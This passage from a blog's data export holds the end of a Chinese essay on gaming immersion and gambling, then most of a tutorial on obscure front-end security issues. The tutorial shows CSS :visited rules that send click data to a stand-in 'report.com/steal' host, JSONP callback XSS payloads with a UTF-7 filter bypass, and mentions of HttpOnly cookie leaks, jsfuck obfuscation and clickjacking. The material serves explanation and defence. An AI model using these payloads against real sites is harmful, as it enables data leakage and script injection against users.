菜鸟也一定能赢一个高手！这跟技术无关，凭着的都是运气与人品，就在爆发的一刹那给你过山车的快感。人有了期待，就有沉浸与等待的动力，而真正赌博中跟金钱挂钩，又无疑更是个感性维度高功率的放大器。</p>\n<p>人的一生都在沉迷赌博，事实上，从你小时候玩玻璃弹珠时就开始了。</p>\n<h2 id=\"何为接地气？\"><strong>何为接地气？</strong></h2>\n<p>琴棋书画，作为衡量文人墨客或大家闺秀的修养标准，古之已有。而真正在能融入生活的，不是登大雅之堂的钢琴，不是分级分段的围棋，更不是象征艺术，被层层装裱的书法与油画，取而代之，是吉他，扑克，网络小说，畅销书，还有动漫。有人概况谓之<strong>接地气</strong>。</p>\n<p>快餐文化的流行，是因为它不太需要思考，不太触及上面提到的“认知”层面。信息流穿墙而过，径直流到你的面前，一耳进一耳出有何不可，图的就是一个爽快！     </p>\n<p>所以“接地气”其实是一种偏“感性”而弃“认知”的沉浸形态。也许又会有这样的疑问，弃认知的形态岂不是不能成为“伟大的游戏”？是的，这样的形态不需要也不可能使人100%沉浸，但它的厉害之处在于持续性。比如，大家不会一遍一遍咬文嚼字像品味红楼梦一样，去阅读一本网络小说。因为它不足已让你得到技能认知方面的满足，但是，你看完了它，说不定又会去看另外的网络小说，因为另外一本，可能会给你新的感官体验。</p>\n<p>为何中国网游层出不穷，但却缺乏精品？因为游戏公司一旦赚钱，不会把过多基金投入到二次开发，反正，你们很快就会厌烦。不如来开发新鲜而老套的网游，不是么？</p>\n<p>The End.</p>\n","source":"_posts/something-about-immersion.markdown","raw":"---\nlayout: post\ntitle: \"谈谈人为何会沉迷游戏？\"\ndate: 2013-11-07 18:55\ncomments: true\ntags: \n\t- 产品 \n\t- 随笔\nbrief: \"读《通用设计法则》\"\n---       \n为何人会沉迷？这个模型很有意思。\n\n![沉浸的模型](/assets/blogImg/immersion.png)\n\n> 当人在“得到技能提升”和“获得挑战后的成就感”这两者中得到一定平衡时，就会陷入沉迷，这个平衡的范围称之为“心流”（flow）。人处在心流状态下，就会陷入沉迷。              \n\n<!-- more -->\n##**“lol，那是小学生玩的”**\n\n试想一局dota为何引人专注？完成击杀或最后胜利时你会获得挑战后的成就感，而无疑你的技术又在游戏中越发娴熟。两者共同作用，人陷其中，几局dota就让一天过去了。事实上，任何成功的游戏都是这样，不会难度超大（否则人会焦虑），也不会让人得不到技能和熟练度的提升（否则人会无聊）。这也解释了为何部分dota玩家谈起lol时，会不屑的说：“那是小学生玩的”。因为dota和lol属同类型游戏，一个熟练的dota玩家的技能维度已经较高，自然在转移到lol后得不到太大的提升，因此偏离了心流通道，使人觉得无趣。如何能合适引导这批玩家呢？唯有做好差异化。只要有不同的玩法和细节，就能让人形成新的技能增长点。这点我认为lol还是做得很不错的。\n\n再说下11平台为何会打败老牌的竞技平台，独树一帜。自然有人说，是因为匹配系统。是的，更深层次的说，是它适配了玩家的挑战水平。在浩方的时候，小白被高手虐得体无完肤的故事喜闻乐见。无疑，对任何人而言，挑战度不合适会给人带来焦虑和恐惧。匹配系统做的事情，其实是把挑战维度稳定在心流通道范围里。\n\n##**赌博，最伟大的游戏**\n\n细分起来，人的沉迷场景其实有两种：感性和认知。举个栗子，迪士尼乐园的过山车，克服心理恐惧是个挑战，而坐过几次后不再那么害怕属于技能增长，但两者存在于感性层面，是精神的主观感受；百家讲坛，许多人喜欢看，讲的东西我们可能压根不懂，可谓之挑战，而知识的渗透关系到技能，但此过程是跟过山车不一样的，人有学到东西，有认知层面的提升。\n\n再细究一下，我们不会每周都去玩过山车，也不会说百家讲坛一集不落的都看。因为他们还不足以让人沉迷。真正能让人沉迷的，必须是“感性”和“认知”两个维度高度统一的场景。facebook上常年居首的第三方应用是德州扑克，国内用户量最大的是QQ游戏大厅，小城镇六合彩屡禁不止，打麻将俨然已冲出国门走向世界。我想说的是——赌博，是最伟大的游戏之一。无论是真实的或变相的，无论历史还是现在，不同年龄段的人都会沉浸其中。源于它扼紧了人性的弱点，又是感性和认知的高度统一。\n\n举斗地主为例子，认知层面就是你牌技的增长，一个新手是很难对付牌场老手的。通过反复的练习，人可以对形势做出更正确的判断。有个朋友就告诉过我，他觉得斗地主是一门艺术。艺术一词，可能过于高贵，但足以概况了人对掌握了更高级技术所带来的满足感。那么感性层面怎么体现呢，就在于游戏的随机性。你给我一副绝世好牌，即使我再菜鸟也一定能赢一个高手！这跟技术无关，凭着的都是运气与人品，就在爆发的一刹那给你过山车的快感。人有了期待，就有沉浸与等待的动力，而真正赌博中跟金钱挂钩，又无疑更是个感性维度高功率的放大器。\n\n人的一生都在沉迷赌博，事实上，从你小时候玩玻璃弹珠时就开始了。\n\n##**何为接地气？**\n\n琴棋书画，作为衡量文人墨客或大家闺秀的修养标准，古之已有。而真正在能融入生活的，不是登大雅之堂的钢琴，不是分级分段的围棋，更不是象征艺术，被层层装裱的书法与油画，取而代之，是吉他，扑克，网络小说，畅销书，还有动漫。有人概况谓之**接地气**。\n\n快餐文化的流行，是因为它不太需要思考，不太触及上面提到的“认知”层面。信息流穿墙而过，径直流到你的面前，一耳进一耳出有何不可，图的就是一个爽快！     \n\n所以“接地气”其实是一种偏“感性”而弃“认知”的沉浸形态。也许又会有这样的疑问，弃认知的形态岂不是不能成为“伟大的游戏”？是的，这样的形态不需要也不可能使人100%沉浸，但它的厉害之处在于持续性。比如，大家不会一遍一遍咬文嚼字像品味红楼梦一样，去阅读一本网络小说。因为它不足已让你得到技能认知方面的满足，但是，你看完了它，说不定又会去看另外的网络小说，因为另外一本，可能会给你新的感官体验。\n\n为何中国网游层出不穷，但却缺乏精品？因为游戏公司一旦赚钱，不会把过多基金投入到二次开发，反正，你们很快就会厌烦。不如来开发新鲜而老套的网游，不是么？\n\nThe End.\n","slug":"something-about-immersion","updated":1409365222000,"excerpt":"<p>为何人会沉迷？这个模型很有意思。</p>\n<p><img src=\"/assets/blogImg/immersion.png\" alt=\"沉浸的模型\"></p>\n<blockquote>\n<p>当人在“得到技能提升”和“获得挑战后的成就感”这两者中得到一定平衡时，就会陷入沉迷，这个平衡的范围称之为“心流”（flow）。人处在心流状态下，就会陷入沉迷。              </p>\n</blockquote>\n<p>","_id":"nosvnd7f49ay91t5","categories":[],"photos":[],"link":""},{"layout":"post","title":"前端安全冷门知识杂谈","date":1401205920000,"comments":true,"tags":["ejm72ndmomwgbvme"],"content":"<h3 id=\"零、概述\">零、概述</h3>\n<p>提起web前端安全，大家都会想到两个名词：<code>xss</code>和<code>csrf</code>。<br>抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。<br>大概分为以下章节：</p>\n<blockquote>\n<p>盗取无法用js读写的Cookie<br>删不掉的本地存储<br>函数覆写监听上报<br>内存Cookie与硬盘Cookie<br>CSS带来的点击量泄露<br>JSONP回调函数与UTF-7编码<br>过滤与代码混淆<br>心理学与社会工程学                  </p>\n</blockquote>\n<p>资料略多，文章较长，请自备瓜子…<br><a id=\"more\"></a></p>\n<h3 id=\"一、盗取无法用js读写的Cookie\">一、盗取无法用js读写的Cookie</h3>\n<p>为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">setcookie(<span class=\"string\">\"test\"</span>, <span class=\"number\">1</span>, <span class=\"built_in\">time</span>()+<span class=\"number\">3600</span>, <span class=\"string\">\"\"</span>, <span class=\"string\">\"\"</span>, <span class=\"number\">0</span>);<span class=\"comment\"> // 设置普通Cookie</span></div><div class=\"line\">setcookie(<span class=\"string\">\"test_http\"</span>, <span class=\"number\">1</span>, <span class=\"built_in\">time</span>()+<span class=\"number\">3600</span>, <span class=\"string\">\"\"</span>, <span class=\"string\">\"\"</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>)<span class=\"comment\">;// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启</span></div></pre></td></tr></table></figure>\n\n<p>我们还是可以通过一些服务器上的漏洞去获取它们。</p>\n<h4 id=\"2-1)_调试信息泄露\">2.1) 调试信息泄露</h4>\n<p>比较经典的是PHP的phpinfo文件：<br><img src=\"/assets/blogImg/safety_001.jpg\" alt=\"phpinfo文件\"><br>如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。<br>访问phpinfo.php，将看到：<br><img src=\"/assets/blogImg/safety_002.jpg\" alt=\"Alt text\"><br>其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。                  </p>\n<h4 id=\"2-2)_Apache_2-2-x版本请求头超长泄露\">2.2) Apache 2.2.x版本请求头超长泄露</h4>\n<p>Cookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。<br>因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。<br><img src=\"/assets/blogImg/safety_003.jpg\" alt=\"Alt text\">                    </p>\n<h3 id=\"三、删不掉的本地存储\">三、删不掉的本地存储</h3>\n<p>如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且”永久”寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。<br>但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案：</p>\n<blockquote>\n<p>Cookie - 是最常见的方式，key-value 模式<br>UserData - IE自己的本地存储，key-value 模式<br>localStorage - HTML5 新增的本地存储，key-value 模式<br>local Database -  HTML5 新增的浏览器本地DataBase，是SQLite 数据库<br>Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器                   </p>\n</blockquote>\n<p>除去这些，我还收集了一些比较“偏门”的存储方案：          </p>\n<blockquote>\n<p>Silverlight的IsolatedStorage - 类似HTML5 localStorage<br>PNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值<br>HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容<br>Web History，利用的是“CSS 判断目标URL 是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix）<br>window.name，本质就是一个DOM 存储，并不存在本地。                   </p>\n</blockquote>\n<p>老外Samy Kamkar用半天开发了一个JavaScript API：<a href=\"http://en.wikipedia.org/wiki/Evercookie\" target=\"_blank\" rel=\"external\">evercookie</a>。<br>该API利用了上面的全部存储手段，将“<code>永不丢失你的cookie</code>”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。</p>\n<h3 id=\"四、函数覆写监听上报\">四、函数覆写监听上报</h3>\n<p>覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：<code>搞跨站的人总习惯用alert来确认是否已成功跨站</code>，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">log</span><span class=\"params\">(s)</span> </span>{</div><div class=\"line\">    <span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</div><div class=\"line\">    img.src = <span class=\"string\">\"http://yousite.com/log.php?caller=\"</span> + <span class=\"built_in\">encodeURIComponent</span>(s);</div><div class=\"line\">}</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">var</span> _alert = alert;</div><div class=\"line\"><span class=\"built_in\">window</span>.alert = <span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(s)</span> </span>{</div><div class=\"line\">    log(alert.caller);</div><div class=\"line\">    _alert(s);</div><div class=\"line\">}</div></pre></td></tr></table></figure>\n\n<p>如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学…<br>其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：《<a href=\"http://www.xfocus.net/articles/200712/963.html\" target=\"_blank\" rel=\"external\">浅谈javascript函数劫持</a>》。</p>\n<h3 id=\"五、内存Cookie与硬盘Cookie\">五、内存Cookie与硬盘Cookie</h3>\n<p><code>内存Cookie</code> - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁<br><code>硬盘Cookie</code> - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期</p>\n<p>我们很容易得出结论：内存Cookie更安全。因此，某些站点会把<code>敏感信息放到内存Cookie</code>里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。                  </p>\n<p>因此，这里有两个关注点：                 </p>\n<ol>\n<li>敏感信息还是不要放Cookie里，即使是内存Cookie；              </li>\n<li>服务器要做Cookie的三个维度的校验 -  唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。               </li>\n</ol>\n<h3 id=\"六、CSS带来的点击量泄露\">六、CSS带来的点击量泄露</h3>\n<p>在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。<br>假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。<br>试想这是一个<code>导航栏组件</code>，html代码是这样的：                 </p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"http://yousite.com/a1\"</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"a1\"</span>&gt;</span>nav1<span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"http://yousite.com/a2\"</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"a2\"</span>&gt;</span>nav2<span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"title\">a</span> <span class=\"attribute\">href</span>=<span class=\"value\">\"http://yousite.com/a3\"</span> <span class=\"attribute\">id</span>=<span class=\"value\">\"a3\"</span>&gt;</span>nav3<span class=\"tag\">&lt;/<span class=\"title\">a</span>&gt;</span></div></pre></td></tr></table></figure>\n\n<p>你忽略掉的css写成这样：                </p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"id\">#a1</span><span class=\"pseudo\">:visited</span> <span class=\"rules\">{<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"function\">url</span>(http://report.com/steal?data=a1)</span></span>;<span class=\"rule\">}</span></span></div><div class=\"line\"><span class=\"id\">#a2</span><span class=\"pseudo\">:visited</span> <span class=\"rules\">{<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"function\">url</span>(http://report.com/steal?data=a2)</span></span>;<span class=\"rule\">}</span></span></div><div class=\"line\"><span class=\"id\">#a3</span><span class=\"pseudo\">:visited</span> <span class=\"rules\">{<span class=\"rule\"><span class=\"attribute\">background</span>:<span class=\"value\"> <span class=\"function\">url</span>(http://report.com/steal?data=a3)</span></span>;<span class=\"rule\">}</span></span></div></pre></td></tr></table></figure>\n\n<p>我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的<code>点击数据量</code>就暴露给第三方了！<br>当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了…<br>HTML5提供伪类<code>::selection</code>，当指定对象区域被选择时，就会触发。其原理跟上面类似。                         </p>\n<h3 id=\"七、JSONP回调函数与UTF-7编码\">七、JSONP回调函数与UTF-7编码</h3>\n<h4 id=\"7-1)_基本原理\">7.1) 基本原理</h4>\n<p>在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求：<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=some_function</code><br>返回数据格式为：<br><code>some_function([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);</code><br>如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。<br>请求：<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;</code><br>返回：<br><code>&lt;script&gt;alert(1);&lt;/script&gt;([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);</code><br>所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？                              </p>\n<h4 id=\"7-2)_IE解析UTF-7漏洞\">7.2) IE解析UTF-7漏洞</h4>\n<p>比较简单的过滤方法，是过滤<code>&lt;&gt;</code>字符，使得无法构成html标签。但在IE6\\IE7的某些版本中，存在以下漏洞：<strong>如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析</strong>（IE7后续版本已发布补丁修复）。<br>在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上”+/v8”头：<br><code>cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4</code><br>这时候巧妙的躲开了<code>&lt;&gt;</code>过滤，而返回：<br><code>+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=&gt;123,data=&gt;’some_data’});</code><br>这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。                       </p>\n<h3 id=\"八、过滤与代码混淆\">八、过滤与代码混淆</h3>\n<p>过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：<a href=\"http://utf-8.jp/public/jsfuck.html\" target=\"_blank\" rel=\"external\">jsfuck</a>。<br>站名如其名，满满的恶意…它可以仅仅用6个字符：<code>[]()!+</code>去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句<code>alert(1)</code>编码成了3009个字符，并执行成功：<br><img src=\"/assets/blogImg/safety_004.jpg\" alt=\"Alt text\"><br>所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。</p>\n<h3 id=\"九、心理学与社会工程学\">九、心理学与社会工程学</h3>\n<p>有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例：</p>\n<h4 id=\"9-1）诱导触发拖拽事件\">9.1）诱导触发拖拽事件</h4>\n<p>比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？<br>很简单，添加一张图片：<br><img src=\"/assets/blogImg/safety_005.jpg\" alt=\"Alt text\"><br>注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。</p>\n<h4 id=\"9-2)_传说中的QQ空间“传染病毒”\">9.2) 传说中的QQ空间“传染病毒”</h4>\n<p>步骤是这样的：                    </p>\n<ol>\n<li>A(始作俑者)发布了一条说说：<code>这个网站很好玩，快来试试吧~ http://xxx.xxx</code>                     </li>\n<li>A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面                     </li>\n<li>好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！）                     </li>\n<li>一传十十传百，越传越广…                     </li>\n</ol>\n<p>但真实的情况跟CSRF没一点关系。玄妙在于：<code>好友们打开链接后干了什么事情？</code><br>这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？<br>用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说…                     </p>\n<p>有人会问，这不是CSRF吗？还真不是。做法却很简单：<br>“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是<code>点击了iframe中的转发按钮</code>。真是令人万万没想到。                     </p>\n<p>以上。<br>End. 5.27 by litten.                                           </p>\n","source":"_posts/safety-point-of-view-from-front-end.markdown","raw":"---\nlayout: post\ntitle: \"前端安全冷门知识杂谈\"\ndate: 2014-05-27 23:52\ncomments: true\ntags: \n\t- web\n---   \n###零、概述\n提起web前端安全，大家都会想到两个名词：`xss`和`csrf`。             \n抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。               \n大概分为以下章节：\n> 盗取无法用js读写的Cookie                 \n删不掉的本地存储                  \n函数覆写监听上报                  \n内存Cookie与硬盘Cookie                  \nCSS带来的点击量泄露                  \nJSONP回调函数与UTF-7编码                  \n过滤与代码混淆                  \n心理学与社会工程学                  \n\n资料略多，文章较长，请自备瓜子…\n<!-- more -->\n###一、盗取无法用js读写的Cookie\n为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。\n```\nsetcookie(\"test\", 1, time()+3600, \"\", \"\", 0); // 设置普通Cookie\nsetcookie(\"test_http\", 1, time()+3600, \"\", \"\", 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启\n```\n我们还是可以通过一些服务器上的漏洞去获取它们。\n\n####2.1) 调试信息泄露\n比较经典的是PHP的phpinfo文件：                    \n![phpinfo文件](/assets/blogImg/safety_001.jpg)                                       \n如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。               \n访问phpinfo.php，将看到：                \n![Alt text](/assets/blogImg/safety_002.jpg)                              \n其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。                  \n\n####2.2) Apache 2.2.x版本请求头超长泄露\nCookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。\n因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。               \n![Alt text](/assets/blogImg/safety_003.jpg)                    \n\n###三、删不掉的本地存储\n如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且\"永久\"寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。                                               \n但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案：\n> Cookie - 是最常见的方式，key-value 模式                   \nUserData - IE自己的本地存储，key-value 模式                   \nlocalStorage - HTML5 新增的本地存储，key-value 模式                   \nlocal Database -  HTML5 新增的浏览器本地DataBase，是SQLite 数据库                   \nFlash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器                   \n\n除去这些，我还收集了一些比较“偏门”的存储方案：          \n> Silverlight的IsolatedStorage - 类似HTML5 localStorage                   \nPNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值                   \nHTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容                   \nWeb History，利用的是“CSS 判断目标URL 是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix）                   \nwindow.name，本质就是一个DOM 存储，并不存在本地。                   \n\n老外Samy Kamkar用半天开发了一个JavaScript API：[evercookie](http://en.wikipedia.org/wiki/Evercookie)。                    \n该API利用了上面的全部存储手段，将“`永不丢失你的cookie`”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。\n\n###四、函数覆写监听上报\n覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：`搞跨站的人总习惯用alert来确认是否已成功跨站`，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。\n```\nfunction log(s) {\n    var img = new Image();\n    img.src = \"http://yousite.com/log.php?caller=\" + encodeURIComponent(s);\n}\n\nvar _alert = alert;\nwindow.alert = function(s) {\n    log(alert.caller);\n    _alert(s);\n}\n```\n如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学…                             \n其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：《[浅谈javascript函数劫持](http://www.xfocus.net/articles/200712/963.html)》。\n\n###五、内存Cookie与硬盘Cookie\n`内存Cookie` - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁                              \n`硬盘Cookie` - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期\n\n我们很容易得出结论：内存Cookie更安全。因此，某些站点会把`敏感信息放到内存Cookie`里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。                  \n\n因此，这里有两个关注点：                 \n1. 敏感信息还是不要放Cookie里，即使是内存Cookie；              \n2. 服务器要做Cookie的三个维度的校验 -  唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。               \n\n###六、CSS带来的点击量泄露\n在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。                   \n假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。                    \n试想这是一个`导航栏组件`，html代码是这样的：                 \n```\n<a href=\"http://yousite.com/a1\" id=\"a1\">nav1</a>\n<a href=\"http://yousite.com/a2\" id=\"a2\">nav2</a>\n<a href=\"http://yousite.com/a3\" id=\"a3\">nav3</a>\n```\n你忽略掉的css写成这样：                \n```\n#a1:visited {background: url(http://report.com/steal?data=a1);}\n#a2:visited {background: url(http://report.com/steal?data=a2);}\n#a3:visited {background: url(http://report.com/steal?data=a3);}\n```\n我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的`点击数据量`就暴露给第三方了！                     \n当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了…                                              \nHTML5提供伪类`::selection`，当指定对象区域被选择时，就会触发。其原理跟上面类似。                         \n\n###七、JSONP回调函数与UTF-7编码\n####7.1) 基本原理 \n在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求：                                 \n`cgi-bin/get_jsonp?id=123&call_back=some_function`                              \n返回数据格式为：                                                  \n`some_function([{'id':123, data:'some_data'}]);`                              \n如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。                              \n请求：                              \n`cgi-bin/get_jsonp?id=123&call_back=<script>alert(1);</script>`\n返回：                              \n`<script>alert(1);</script>([{'id':123, data:'some_data'}]);`                              \n所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？                              \n####7.2) IE解析UTF-7漏洞\n比较简单的过滤方法，是过滤`<>`字符，使得无法构成html标签。但在IE6\\IE7的某些版本中，存在以下漏洞：**如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析**（IE7后续版本已发布补丁修复）。                       \n在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上\"+/v8\"头：                       \n`cgi-bin/get_jsonp?id=123&callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4`                       \n这时候巧妙的躲开了`<>`过滤，而返回：                       \n`+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=>123,data=>’some_data’});`                       \n这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。                       \n\n###八、过滤与代码混淆\n过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：[jsfuck](http://utf-8.jp/public/jsfuck.html)。                     \n站名如其名，满满的恶意…它可以仅仅用6个字符：`[]()!+`去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句`alert(1)`编码成了3009个字符，并执行成功：                              \n![Alt text](/assets/blogImg/safety_004.jpg)                              \n所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。\n\n###九、心理学与社会工程学\n有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例：\n####9.1）诱导触发拖拽事件\n比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？                      \n很简单，添加一张图片：                      \n![Alt text](/assets/blogImg/safety_005.jpg)                      